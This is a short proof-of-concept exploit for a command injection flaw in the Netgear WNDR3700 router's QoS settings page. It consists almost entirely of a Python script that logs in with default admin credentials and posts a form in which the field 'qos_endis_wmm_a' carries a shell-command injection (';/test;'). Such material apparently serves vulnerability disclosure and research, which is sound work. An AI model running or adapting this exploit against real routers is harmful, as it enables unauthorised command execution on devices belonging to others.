# PoC
WNDR3700 has a command injection vulnerability at "/apply.cgi?/QOS_main.htm"


```
#!/usr/bin/env python3
import requests, re, time



def make_request(target, port, path, datas):

    headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Authorization": "Basic YWRtaW46cGFzc3dvcmQ="}


    url = "http://{}:{}/".format(target, port)

    try:
        r1 = requests.get(url, headers=headers)
        # print(r1.text)
    except:
        print ('[-] Target not reachable, Exiting...')

    time.sleep(1)
    headers["Content-Length"] = "233"
    url = "http://{}:{}{}".format(target, port, path)

    r3 = requests.post(url, headers=headers, data=datas)
    # try:
    #     r3 = requests.post(url, headers=headers, data=datas)
    # except:
    #     print ('[-] Target not reachable, Exiting...')





if __name__ == '__main__':
    host = "192.168.1.1"
    port = 80
    path = '/apply.cgi?/QOS_main.htm'
    payload = ';/test;'
    datas = {"submit_flag": "apply_qos", "qos_endis_wmm": "1", "qos_endis_wmm_a": "1", "qos_endis_on": "0", "qos_endis_bandwidth": "0", "qos_hidden_uprate": "256", "wan_ip": "0.0.0.0", "dns_ip": "0.0.0.0", "wmm_enable": "1", "wmm_enable_a": "1", "qos_uprate": "256", "apply": "Apply"}
    datas["qos_endis_wmm_a"] = payload
    make_request(host, port, path, datas)

```

